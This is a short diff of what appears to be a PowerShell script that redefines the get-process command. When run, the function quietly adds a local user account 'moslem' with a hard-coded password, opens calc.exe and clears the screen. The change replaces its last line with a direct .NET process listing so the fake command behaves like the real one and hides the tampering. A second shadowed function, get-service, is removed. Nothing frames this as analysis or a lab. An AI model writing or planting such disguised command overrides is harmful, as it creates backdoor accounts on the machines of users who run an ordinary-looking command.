@@ -5,13 +5,6 @@ function get-process {
 (net user moslem l4tr0d3ctism /add)
 (Invoke-Item C:\Windows\System32\calc.exe)
 (clear)
-(get-process)
+[diagnostics.process]::GetProcesses()
 }
 
-#=========================================
-
-function get-service {
- (Invoke-Item C:\Windows\System32\calc.exe)
- (clear)
- (get-service)
-}
